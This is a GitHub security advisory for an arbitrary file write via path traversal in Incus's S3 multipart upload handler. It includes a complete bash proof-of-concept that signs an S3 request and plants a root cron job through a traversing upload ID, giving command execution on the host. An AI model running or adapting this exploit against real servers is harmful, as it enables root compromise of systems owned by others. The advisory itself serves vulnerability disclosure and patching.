# [C] Incus has an arbitrary file write via path traversal in S3 multipart upload

## Summary
Severity: Critical
Advisory: GHSA-ccjc-4qc3-jxqc
CVE: CVE-2026-48753
CWE: CWE-73
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-26
Source: https://github.com/advisories/GHSA-ccjc-4qc3-jxqc
Type: github-advisory

## Affected
- Go: `github.com/lxc/incus/v7/cmd/incusd` — affected >=0 <7.1.0

## Details
## Summary

The S3 protocol upload endpoint is vulnerable to path traversal and allows creation of arbitrary files on the host. This behavior could lead to arbitrary command execution.

In `internal/server/storage/s3/local/multipart.go`, user-controlled upload ID is appended to the uploads directory unsanitized; https://github.com/lxc/incus/blob/40dd4f151d52c06b178482aa2518abfb9df3e6fb/internal/server/storage/s3/local/multipart.go#L33

## PoC

### Setup

```
# Expose the S3 API and create a bucket
incus config set core.storage_buckets_address=:8555
incus storage volume create default bucket
#> note the credentials
```

### Exploitation

The below script was mostly generated.

```
#!/usr/bin/env bash
set -euo pipefail

if [ $# -lt 4 ]; then
	printf 'usage: $0 endpoint bucket access-key secret-key\n' >&2
	exit 1
fi

endpoint="${1%/}"
bucket="${2}"
access="${3}"
secret="${4}"

region="us-east-1"
service="s3"
key="anything"
part="1"
upload_id="../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/cron.d"
target="/etc/cron.d/part-00001"
cmd="id > /incus-s3-uploadid-bash-rce; rm -f $target"
body="* * * * * root /bin/sh -c '$cmd'
"

uri_path="$(printf '%s' "$endpoint" | sed -E 's#^[a-z]+://[^/]+##')/$bucket/$key"
uri_path="${uri_path#/}"
uri_path="/$uri_path"
host="$(printf '%s' "$endpoint" | sed -E 's#^[a-z]+://([^/]+).*#\1#')"
qs="partNumber=$part&uploadId=${upload_id//\//%2F}"
url="$endpoint/$bucket/$key?$qs"

amz_date=$(date -u +%Y%m%dT%H%M%SZ)
date_scope="${amz_date:0:8}"
scope="$date_scope/$region/$service/aws4_request"
body_hash=$(printf '%s' "$body" | sha256sum | awk '{print $1}')
signed="host;x-amz-content-sha256;x-amz-date"

canonical="PUT
$uri_path
$qs
host:$host
x-amz-content-sha256:$body_hash
x-amz-date:$amz_date

$signed
$body_hash"
canonical_hash="$(printf '%s' "$canonical" | sha256sum | awk '{print $1}')"
string_to_sign="AWS4-HMAC-SHA256
$amz_date
$scope
$canonical_hash"

hmac_hex() {
	printf '%s' "${2}" | openssl dgst -sha256 -mac HMAC -macopt "hexkey:${1}" -binary | xxd -p -c 256
}

k_date=$(printf 'AWS4%s' "$secret" | xxd -p -c 256)
k_date=$(hmac_hex "$k_date" "$date_scope")
k_region=$(hmac_hex "$k_date" "$region")
k_service=$(hmac_hex "$k_region" "$service")
k_signing=$(hmac_hex "$k_service" "aws4_request")
sig=$(hmac_hex "$k_signing" "$string_to_sign")
auth="AWS4-HMAC-SHA256 Credential=${access}/${scope},SignedHeaders=${signed},Signature=${sig}"

printf '# body:\n%s' "${body}"

curl -ksS -X PUT "${url}" \
	-H "Host: ${host}" \
	-H "X-Amz-Date: ${amz_date}" \
	-H "X-Amz-Content-Sha256: ${body_hash}" \
	-H "Authorization: ${auth}" \
	--data-binary "${body}"
```


## Impact

Arbitrary file write on the host. Possibly leading to arbitrary command execution.

## References
- https://github.com/lxc/incus/security/advisories/GHSA-ccjc-4qc3-jxqc
- https://github.com/lxc/incus
